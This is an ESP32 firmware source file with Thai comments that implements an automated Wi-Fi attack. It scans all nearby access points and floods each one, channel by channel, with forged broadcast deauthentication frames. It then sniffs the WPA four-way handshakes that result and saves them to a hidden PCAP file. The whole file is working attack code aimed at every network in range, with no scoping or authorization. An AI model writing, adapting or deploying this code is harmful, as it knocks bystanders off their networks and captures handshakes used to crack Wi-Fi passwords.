#include "pcap_manager.h"
#include "globals.h"
#include "hardware.h"
#include <WiFi.h>
#include <SPIFFS.h>
#include "esp_wifi.h"
#include "esp_wifi_types.h"

// Forward declaration
void blinkLED(int duration);

// ==================== DEAUTH PACKET TEMPLATE ====================
uint8_t deauthPacket[26] = {
    0xc0, 0x00,                         // Type/Subtype: Deauthentication
    0x00, 0x00,                         // Duration
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff, // Destination: broadcast
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source (AP BSSID) - จะถูกแทนที่
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID (AP BSSID) - จะถูกแทนที่
    0x00, 0x00,                         // Sequence
    0x07, 0x00                          // Reason: Class 3 frame from nonassoc STA
};

// ==================== INITIALIZATION FUNCTIONS ====================
void initSPIFFS() {
    Serial.println("[INIT] กำลังเริ่มต้น SPIFFS...");
    
    // พยายามเริ่มต้น SPIFFS (formatOnFail = false)
    if (!SPIFFS.begin(false)) {
        Serial.println("[WARNING] ไม่สามารถเริ่มต้น SPIFFS ได้!");
        Serial.println("[INIT] กำลัง format SPIFFS...");
        
        // ลอง format แล้วเริ่มใหม่
        if (!SPIFFS.format()) {
            Serial.println("[ERROR] ไม่สามารถ format SPIFFS ได้!");
            Serial.println("[ERROR] กรุณาตรวจสอบ partition scheme ใน Arduino IDE");
            Serial.println("[ERROR] แนะนำ: Tools > Partition Scheme > Default 4MB with spiffs");
            
            // กระพิบ LED แสดง error
            for (int i = 0; i < 10; i++) {
                digitalWrite(LED_PIN, HIGH);
                delay(100);
                digitalWrite(LED_PIN, LOW);
                delay(100);
            }
            return;
        }
        
        Serial.println("[INIT] Format SPIFFS สำเร็จ!");
        
        // ลองเริ่มต้นอีกครั้งหลัง format
        if (!SPIFFS.begin(false)) {
            Serial.println("[ERROR] ยังไม่สามารถเริ่มต้น SPIFFS ได้หลัง format!");
            Serial.println("[ERROR] อาจมีปัญหากับ hardware หรือ partition");
            
            // กระพิบ LED แสดง error
            for (int i = 0; i < 10; i++) {
                digitalWrite(LED_PIN, HIGH);
                delay(100);
                digitalWrite(LED_PIN, LOW);
                delay(100);
            }
            return;
        }
    }
    
    Serial.println("[INIT] SPIFFS เริ่มต้นสำเร็จ!");
    
    // ตรวจสอบพื้นที่
    size_t totalBytes = SPIFFS.totalBytes();
    size_t usedBytes = SPIFFS.usedBytes();
    size_t freeBytes = totalBytes - usedBytes;
    
    Serial.printf("[INIT] SPIFFS: %d KB ทั้งหมด, %d KB ใช้แล้ว, %d KB ว่าง\n", 
                 totalBytes / 1024, usedBytes / 1024, freeBytes / 1024);
    
    // ตรวจสอบพื้นที่ว่าง
    if (totalBytes == 0) {
        Serial.println("[ERROR] SPIFFS partition ไม่ถูกต้อง!");
        Serial.println("[ERROR] กรุณาเลือก Partition Scheme ที่มี SPIFFS");
        Serial.println("[ERROR] Tools > Partition Scheme > Default 4MB with spiffs");
    } else if (freeBytes < 50000) {
        Serial.println("[WARNING] พื้นที่ SPIFFS เหลือน้อย!");
        Serial.printf("[WARNING] เหลือเพียง %d KB\n", freeBytes / 1024);
        
        // แสดงรายการไฟล์
        Serial.println("[INFO] รายการไฟล์ใน SPIFFS:");
        File root = SPIFFS.open("/");
        File file = root.openNextFile();
        int fileCount = 0;
        
        while (file) {
            if (!file.isDirectory()) {
                fileCount++;
                Serial.printf("[INFO] - %s (%d bytes)\n", file.name(), file.size());
            }
            file = root.openNextFile();
        }
        
        if (fileCount == 0) {
            Serial.println("[INFO] ไม่มีไฟล์ใน SPIFFS");
        } else {
            Serial.printf("[INFO] พบ %d ไฟล์\n", fileCount);
            Serial.println("[INFO] แนะนำ: ลบไฟล์เก่าผ่าน Web Interface");
        }
    }
}

void initWiFi() {
    Serial.println("[INIT] กำลังเริ่มต้น WiFi สำหรับการดักจับ...");
    
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    delay(100);
    
    Serial.println("[INIT] WiFi พร้อมสำหรับการดักจับ");
}

// ==================== HELPER FUNCTIONS ====================
String getSSIDFromBSSID(uint8_t* bssid) {
    // หา SSID จาก BSSID ในรายการ AP ที่สแกนได้
    for (int i = 0; i < apCount; i++) {
        if (memcmp(apList[i].bssid, bssid, 6) == 0) {
            return String(apList[i].ssid);
        }
    }
    return "UNKNOWN";
}

// ==================== AP SCANNING FUNCTIONS ====================
void deepScanAllAPs() {
    Serial.println("========================================");
    Serial.println("[SCAN] เริ่มสแกน AP ทั้งหมดแบบ DEEP SCAN...");
    
    apCount = 0;
    activeChannelCount = 0;
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    delay(100);
    
    // DEEP SCAN: 800ms ต่อช่อง = ~9 วินาทีสำหรับ 11 ช่อง
    int n = WiFi.scanNetworks(false, true, false, 800);
    
    if (n > 0) {
        Serial.printf("[SCAN] พบ %d AP\n", n);
        
        // Track ว่าช่องไหนมี AP บ้าง
        bool channelHasAP[MAX_CHANNELS + 1] = {false};
        
        for (int i = 0; i < n && apCount < MAX_APS; i++) {
            String ssid = WiFi.SSID(i);
            
            // จัดการ Hidden SSID
            if (ssid.length() == 0) {
                strcpy(apList[apCount].ssid, "#HIDDEN");
            } else {
                strncpy(apList[apCount].ssid, ssid.c_str(), 32);
                apList[apCount].ssid[32] = '\0';
            }
            
            uint8_t* bssid = WiFi.BSSID(i);
            if (bssid) {
                memcpy(apList[apCount].bssid, bssid, 6);
            }
            
            apList[apCount].channel = WiFi.channel(i);
            apList[apCount].rssi = WiFi.RSSI(i);
            
            // Mark channel ว่ามี AP
            if (apList[apCount].channel >= 1 && apList[apCount].channel <= MAX_CHANNELS) {
                channelHasAP[apList[apCount].channel] = true;
            }
            
            Serial.printf("[SCAN] AP%d: %s | CH:%d | RSSI:%d | %02X:%02X:%02X:%02X:%02X:%02X\n",
                         apCount + 1,
                         apList[apCount].ssid,
                         apList[apCount].channel,
                         apList[apCount].rssi,
                         bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5]);
            
            apCount++;
        }
        
        // สร้างรายการ active channels (ช่องที่มี AP)
        for (int ch = 1; ch <= MAX_CHANNELS; ch++) {
            if (channelHasAP[ch]) {
                activeChannels[activeChannelCount++] = ch;
            }
        }
        
        // แสดงสถิติตามช่อง
        Serial.println("[SCAN] สถิติตามช่อง:");
        for (int i = 0; i < activeChannelCount; i++) {
            int ch = activeChannels[i];
            int count = 0;
            for (int j = 0; j < apCount; j++) {
                if (apList[j].channel == ch) count++;
            }
            Serial.printf("[SCAN] CH%d: %d APs\n", ch, count);
        }
        
        Serial.printf("[SCAN] Active Channels: ");
        for (int i = 0; i < activeChannelCount; i++) {
            Serial.printf("%d ", activeChannels[i]);
        }
        Serial.println();
    } else {
        Serial.println("[SCAN] ไม่พบ AP");
    }
    
    WiFi.scanDelete();
    Serial.println("========================================");
}

// ==================== PCAP FILE FUNCTIONS ====================
String getUniqueFilename(const char* baseFilename) {
    // ตรวจสอบว่าไฟล์มีอยู่หรือไม่
    String filename = String(baseFilename);
    
    if (!SPIFFS.exists(filename)) {
        return filename;
    }
    
    // แยกชื่อและนามสกุล
    int dotPos = filename.lastIndexOf('.');
    String name = filename.substring(0, dotPos);
    String ext = filename.substring(dotPos);
    
    // ลอง (2), (3), etc.
    for (int i = 2; i < 100; i++) {
        String newFilename = name + "(" + String(i) + ")" + ext;
        if (!SPIFFS.exists(newFilename)) {
            return newFilename;
        }
    }
    
    // สำรอง: ใช้ timestamp
    return name + "_" + String(millis()) + ext;
}

void createPcapFile() {
    // สร้างชื่อไฟล์ตามรูปแบบ /.auto_<seed-mills>.pcap
    char baseFilename[32];
    snprintf(baseFilename, sizeof(baseFilename), "/.auto_%lu.pcap", millis());
    
    // ตรวจสอบชื่อไฟล์ที่ไม่ซ้ำ
    String uniqueFilename = getUniqueFilename(baseFilename);
    strncpy(currentFilename, uniqueFilename.c_str(), sizeof(currentFilename) - 1);
    currentFilename[sizeof(currentFilename) - 1] = '\0';
    
    pcapFile = SPIFFS.open(currentFilename, "w");
    
    if (pcapFile) {
        fileOpen = true;
        
        // เขียน PCAP header
        pcap_hdr_t hdr;
        hdr.magic_number = 0xa1b2c3d4;
        hdr.version_major = 2;
        hdr.version_minor = 4;
        hdr.thiszone = 0;
        hdr.sigfigs = 0;
        hdr.snaplen = 65535;
        hdr.network = 105; // IEEE 802.11
        
        pcapFile.write((uint8_t*)&hdr, sizeof(pcap_hdr_t));
        pcapFile.flush();
        
        Serial.printf("[PCAP] สร้างไฟล์: %s\n", currentFilename);
    } else {
        fileOpen = false;
        Serial.println("[ERROR] ไม่สามารถสร้างไฟล์ PCAP ได้!");
    }
}

void closePcapFile() {
    if (fileOpen && pcapFile) {
        pcapFile.close();
        fileOpen = false;
        Serial.printf("[PCAP] ปิดไฟล์: %s\n", currentFilename);
    }
}

// ==================== PACKET HANDLER ====================
void processEAPOLPacket(uint8_t* payload, uint16_t len, int eapolOffset) {
    // ดึง BSSID (Address 3, bytes 16-21)
    uint8_t bssid[6];
    memcpy(bssid, &payload[16], 6);
    
    // หา SSID จาก BSSID
    String ssid = getSSIDFromBSSID(bssid);
    
    // หาหรือสร้าง handshake entry
    int idx = -1;
    for (int i = 0; i < handshakeCount; i++) {
        if (memcmp(handshakes[i].bssid, bssid, 6) == 0) {
            idx = i;
            break;
        }
    }
    
    if (idx == -1 && handshakeCount < MAX_HANDSHAKES) {
        idx = handshakeCount++;
        memcpy(handshakes[idx].bssid, bssid, 6);
        handshakes[idx].channel = currentChannel;
        handshakes[idx].messageFlags = 0;
        handshakes[idx].timestamp = millis();
        handshakes[idx].complete = false;
        
        Serial.printf("[HANDSHAKE] ใหม่ #%d: %s | %02X:%02X:%02X:%02X:%02X:%02X | CH%d\n",
                     handshakeCount,
                     ssid.c_str(),
                     bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5],
                     currentChannel);
    }
    
    if (idx >= 0 && len > eapolOffset + 6) {
        uint8_t packetType = payload[eapolOffset + 1];
        
        if (packetType == 3) { // Key frame
            uint16_t keyInfo = (payload[eapolOffset + 5] << 8) | payload[eapolOffset + 6];
            
            bool isPairwise = (keyInfo & 0x0008) != 0;
            bool hasInstall = (keyInfo & 0x0040) != 0;
            bool hasAck = (keyInfo & 0x0080) != 0;
            bool hasMic = (keyInfo & 0x0100) != 0;
            
            if (isPairwise) {
                if (hasAck && !hasMic && !hasInstall) {
                    // Message 1
                    if (!(handshakes[idx].messageFlags & 0x01)) {
                        handshakes[idx].messageFlags |= 0x01;
                        Serial.printf("[HANDSHAKE] M1 #%d: %s | %02X:%02X:%02X:%02X:%02X:%02X | CH%d\n",
                                     idx + 1,
                                     ssid.c_str(),
                                     bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5],
                                     currentChannel);
                        blinkLED(100); // กระพิบสั้น
                    }
                } else if (!hasAck && hasMic && !hasInstall) {
                    // Message 2 or 4
                    if ((handshakes[idx].messageFlags & 0x01) && !(handshakes[idx].messageFlags & 0x02)) {
                        handshakes[idx].messageFlags |= 0x02;
                        Serial.printf("[HANDSHAKE] M2 #%d: %s | %02X:%02X:%02X:%02X:%02X:%02X | CH%d\n",
                                     idx + 1,
                                     ssid.c_str(),
                                     bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5],
                                     currentChannel);
                        blinkLED(100); // กระพิบสั้น
                    } else if ((handshakes[idx].messageFlags & 0x04) && !(handshakes[idx].messageFlags & 0x08)) {
                        handshakes[idx].messageFlags |= 0x08;
                        Serial.printf("[HANDSHAKE] M4 #%d: %s | %02X:%02X:%02X:%02X:%02X:%02X | CH%d\n",
                                     idx + 1,
                                     ssid.c_str(),
                                     bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5],
                                     currentChannel);
                        blinkLED(500); // ติดยาว 500ms
                    }
                } else if (hasAck && hasMic && hasInstall) {
                    // Message 3
                    if (!(handshakes[idx].messageFlags & 0x04)) {
                        handshakes[idx].messageFlags |= 0x04;
                        Serial.printf("[HANDSHAKE] M3 #%d: %s | %02X:%02X:%02X:%02X:%02X:%02X | CH%d\n",
                                     idx + 1,
                                     ssid.c_str(),
                                     bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5],
                                     currentChannel);
                        blinkLED(100); // กระพิบสั้น
                    }
                }
            }
            
            // ตรวจสอบว่าครบ 4 message หรือไม่
            if (handshakes[idx].messageFlags == 0x0F && !handshakes[idx].complete) {
                handshakes[idx].complete = true;
                
                // นับจำนวน handshake ที่สมบูรณ์
                int completeCount = 0;
                for (int i = 0; i < handshakeCount; i++) {
                    if (handshakes[i].complete) completeCount++;
                }
                
                Serial.println("========================================");
                Serial.printf("[SUCCESS] ✓ HANDSHAKE สมบูรณ์! #%d (รวม %d ตัว)\n", idx + 1, completeCount);
                Serial.printf("[SUCCESS] SSID: %s\n", ssid.c_str());
                Serial.printf("[SUCCESS] BSSID: %02X:%02X:%02X:%02X:%02X:%02X\n",
                             bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5]);
                Serial.printf("[SUCCESS] Channel: %d\n", currentChannel);
                Serial.printf("[SUCCESS] ไฟล์: %s\n", currentFilename);
                Serial.println("========================================");
                
                // กระพิบ LED 3 ครั้งเพื่อแสดงความสำเร็จ
                for (int i = 0; i < 3; i++) {
                    blinkLED(200);
                    delay(100);
                }
            }
        }
    }
}

void packetHandler(void* buf, wifi_promiscuous_pkt_type_t type) {
    // Optimization: ตรวจสอบ heap ก่อนประมวลผล
    if (ESP.getFreeHeap() < 8000) return;
    
    wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
    uint8_t* payload = pkt->payload;
    uint16_t len = pkt->rx_ctrl.sig_len;
    
    // Optimization: ตรวจสอบขนาด packet ที่เหมาะสม
    if (len < 24 || len > 1500) return;
    
    packetCount++;
    
    // Optimization: ตรวจสอบ EAPOL เฉพาะ Data frame เท่านั้น
    uint8_t frameType = (payload[0] & 0x0C) >> 2;
    if (frameType == 2) { // Data frame only
        uint8_t frameSubtype = (payload[0] & 0xF0) >> 4;
        int dataOffset = (frameSubtype == 8) ? 26 : 24; // QoS Data : Normal Data
        
        // Optimization: ตรวจสอบ EAPOL signature อย่างรวดเร็ว
        if (len > dataOffset + 8 && 
            payload[dataOffset] == 0xAA && 
            payload[dataOffset + 1] == 0xAA && 
            payload[dataOffset + 2] == 0x03 &&
            payload[dataOffset + 6] == 0x88 && 
            payload[dataOffset + 7] == 0x8e) {
            
            processEAPOLPacket(payload, len, dataOffset + 8);
        }
    }
    
    // Optimization: เขียนไฟล์แบบ batch
    if (fileOpen) {
        pcaprec_hdr_t pkthdr;
        uint32_t timestamp = millis();
        pkthdr.ts_sec = timestamp / 1000;
        pkthdr.ts_usec = (timestamp % 1000) * 1000;
        pkthdr.incl_len = len;
        pkthdr.orig_len = len;
        
        pcapFile.write((uint8_t*)&pkthdr, sizeof(pcaprec_hdr_t));
        pcapFile.write(payload, len);
        
        // Optimization: flush ทุก 20 packets แทน 10
        static uint8_t flushCounter = 0;
        if (++flushCounter >= 20) {
            pcapFile.flush();
            flushCounter = 0;
        }
    }
}

// ==================== DEAUTH FUNCTIONS ====================
void sendDeauthToChannel(uint8_t channel) {
    Serial.printf("[DEAUTH] ส่ง deauth ไป CH%d เป็นเวลา %d วินาที...\n", channel, DEAUTH_DURATION / 1000);
    
    uint32_t startTime = millis();
    int sentCount = 0;
    
    // Optimization: นับ AP ในช่องนี้ก่อน
    int targetCount = 0;
    for (int i = 0; i < apCount; i++) {
        if (apList[i].channel == channel) targetCount++;
    }
    
    if (targetCount == 0) {
        Serial.printf("[DEAUTH] ไม่มี AP ใน CH%d\n", channel);
        return;
    }
    
    while (millis() - startTime < DEAUTH_DURATION) {
        // ส่ง deauth ไปทุก AP ในช่องนี้
        for (int i = 0; i < apCount; i++) {
            if (apList[i].channel == channel) {
                // ใส่ BSSID ของ AP ลงใน deauth packet
                memcpy(&deauthPacket[10], apList[i].bssid, 6); // Source (AP)
                memcpy(&deauthPacket[16], apList[i].bssid, 6); // BSSID (AP)
                
                esp_wifi_80211_tx(WIFI_IF_STA, deauthPacket, sizeof(deauthPacket), false);
                deauthCount++;
                sentCount++;
            }
        }
        delay(DEAUTH_INTERVAL);
        
        // Optimization: ตรวจสอบ memory ระหว่างส่ง
        if (ESP.getFreeHeap() < 10000) {
            Serial.println("[DEAUTH] Low memory - stopping early");
            break;
        }
    }
    
    Serial.printf("[DEAUTH] ส่งเสร็จ CH%d: %d packets ไป %d APs\n", channel, sentCount, targetCount);
}

// ==================== MAIN CAPTURE FUNCTIONS ====================
void startCapture() {
    Serial.println("========================================");
    Serial.println("[CAPTURE] เริ่มการดักจับ handshake");
    Serial.println("[CAPTURE] รูปแบบ: Deauth 2วิ -> Capture 5วิ -> Hop");
    Serial.println("[CAPTURE] Hop เฉพาะช่องที่มี AP เท่านั้น");
    Serial.println("========================================");
    
    handshakeCount = 0;
    packetCount = 0;
    deauthCount = 0;
    cycleCount = 0;
    isCapturing = true;
    
    // ตั้งค่า active channel
    if (activeChannelCount > 0) {
        activeChannelIndex = 0;
        currentChannel = activeChannels[0];
    } else {
        // Fallback ถ้าไม่มี AP (ไม่น่าเกิด)
        currentChannel = 1;
    }
    
    // สร้างไฟล์ PCAP
    createPcapFile();
    
    // เริ่ม WiFi promiscuous mode
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    delay(100);
    
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(&packetHandler);
    
    // เริ่มที่ช่องแรกที่มี AP
    channelStartTime = millis();
    isDeauthPhase = true;
    esp_wifi_set_channel(currentChannel, WIFI_SECOND_CHAN_NONE);
    
    Serial.printf("[CAPTURE] เริ่มที่ CH%d - Phase: DEAUTH (Active channels: %d)\n", 
                  currentChannel, activeChannelCount);
}

void updateCapture() {
    if (!isCapturing) return;
    
    uint32_t currentTime = millis();
    uint32_t timeOnChannel = currentTime - channelStartTime;
    
    if (isDeauthPhase) {
        // Phase 1: ส่ง Deauth เป็นเวลา 2 วินาที
        if (timeOnChannel >= DEAUTH_DURATION) {
            Serial.printf("[CAPTURE] CH%d - เปลี่ยนเป็น Phase: CAPTURE\n", currentChannel);
            isDeauthPhase = false;
            channelStartTime = currentTime; // รีเซ็ตเวลา
        } else {
            // ส่ง deauth packets อย่างต่อเนื่อง
            static uint32_t lastDeauth = 0;
            if (currentTime - lastDeauth >= DEAUTH_INTERVAL) {
                lastDeauth = currentTime;
                
                // ส่ง deauth ไปทุก AP ในช่องปัจจุบัน
                for (int i = 0; i < apCount; i++) {
                    if (apList[i].channel == currentChannel) {
                        memcpy(&deauthPacket[10], apList[i].bssid, 6);
                        memcpy(&deauthPacket[16], apList[i].bssid, 6);
                        
                        esp_wifi_80211_tx(WIFI_IF_STA, deauthPacket, sizeof(deauthPacket), false);
                        deauthCount++;
                    }
                }
            }
        }
    } else {
        // Phase 2: Capture handshake เป็นเวลา 5 วินาที
        if (timeOnChannel >= CAPTURE_DURATION) {
            // เปลี่ยนช่อง - Hop เฉพาะช่องที่มี AP
            if (activeChannelCount > 0) {
                activeChannelIndex++;
                if (activeChannelIndex >= activeChannelCount) {
                    activeChannelIndex = 0;
                    cycleCount++;
                    
                    // นับ handshake ที่สมบูรณ์
                    int completeCount = 0;
                    for (int i = 0; i < handshakeCount; i++) {
                        if (handshakes[i].complete) completeCount++;
                    }
                    
                    Serial.println("========================================");
                    Serial.printf("[CAPTURE] รอบที่ %d เสร็จ! HS: %d/%d, PKT: %lu, DEAUTH: %lu\n", 
                                 cycleCount, completeCount, handshakeCount, packetCount, deauthCount);
                    Serial.println("[CAPTURE] เริ่มสแกน AP ใหม่เพื่อหา SSID ใหม่...");
                    Serial.println("========================================");
                    
                    // หยุด promiscuous mode ชั่วคราว
                    esp_wifi_set_promiscuous(false);
                    
                    // สแกน AP ใหม่
                    deepScanAllAPs();
                    
                    // Optimization: ทำความสะอาด memory หลังสแกน
                    optimizeMemory();
                    
                    // เริ่ม promiscuous mode ใหม่
                    esp_wifi_set_promiscuous(true);
                    esp_wifi_set_promiscuous_rx_cb(&packetHandler);
                    
                    // รีเซ็ต index ถ้าจำนวน active channels เปลี่ยน
                    if (activeChannelIndex >= activeChannelCount) {
                        activeChannelIndex = 0;
                    }
                    
                    Serial.println("========================================");
                    Serial.printf("[CAPTURE] เริ่มรอบที่ %d - พบ AP รวม %d ตัว ใน %d ช่อง\n", 
                                 cycleCount + 1, apCount, activeChannelCount);
                    Serial.println("========================================");
                }
                
                // เปลี่ยนไปช่องถัดไป (เฉพาะช่องที่มี AP)
                currentChannel = activeChannels[activeChannelIndex];
                Serial.printf("[CAPTURE] Hop ไป CH%d (%d/%d active channels)\n", 
                             currentChannel, activeChannelIndex + 1, activeChannelCount);
            } else {
                // Fallback: ถ้าไม่มี active channels (ไม่น่าเกิด)
                currentChannel++;
                if (currentChannel > MAX_CHANNELS) {
                    currentChannel = 1;
                }
                Serial.printf("[CAPTURE] Fallback hop ไป CH%d\n", currentChannel);
            }
            
            // เปลี่ยนช่องและรีเซ็ตเวลา
            esp_wifi_set_channel(currentChannel, WIFI_SECOND_CHAN_NONE);
            channelStartTime = currentTime;
            isDeauthPhase = true;
            
            Serial.printf("[CAPTURE] CH%d - Phase: DEAUTH\n", currentChannel);
        }
    }
}

void stopCapture() {
    if (!isCapturing) return;
    
    esp_wifi_set_promiscuous(false);
    WiFi.mode(WIFI_OFF);
    
    closePcapFile();
    isCapturing = false;
    
    // นับ handshake ที่สมบูรณ์
    int completeCount = 0;
    for (int i = 0; i < handshakeCount; i++) {
        if (handshakes[i].complete) completeCount++;
    }
    
    Serial.println("========================================");
    Serial.println("[CAPTURE] หยุดการดักจับ");
    Serial.printf("[CAPTURE] สถิติรวม:\n");
    Serial.printf("[CAPTURE] - รอบทั้งหมด: %d\n", cycleCount);
    Serial.printf("[CAPTURE] - Handshakes: %d/%d สมบูรณ์\n", completeCount, handshakeCount);
    Serial.printf("[CAPTURE] - Packets: %lu\n", packetCount);
    Serial.printf("[CAPTURE] - Deauth sent: %lu\n", deauthCount);
    Serial.printf("[CAPTURE] - ไฟล์: %s\n", currentFilename);
    
    // แสดงรายละเอียด handshakes
    for (int i = 0; i < handshakeCount; i++) {
        String ssid = getSSIDFromBSSID(handshakes[i].bssid);
        Serial.printf("[CAPTURE] HS%d: %s | CH%d | Flags:%d%d%d%d %s\n", 
                     i + 1,
                     ssid.c_str(),
                     handshakes[i].channel,
                     (handshakes[i].messageFlags & 0x01) ? 1 : 0,
                     (handshakes[i].messageFlags & 0x02) ? 1 : 0,
                     (handshakes[i].messageFlags & 0x04) ? 1 : 0,
                     (handshakes[i].messageFlags & 0x08) ? 1 : 0,
                     handshakes[i].complete ? "[COMPLETE]" : "");
    }
    
    Serial.println("========================================");
}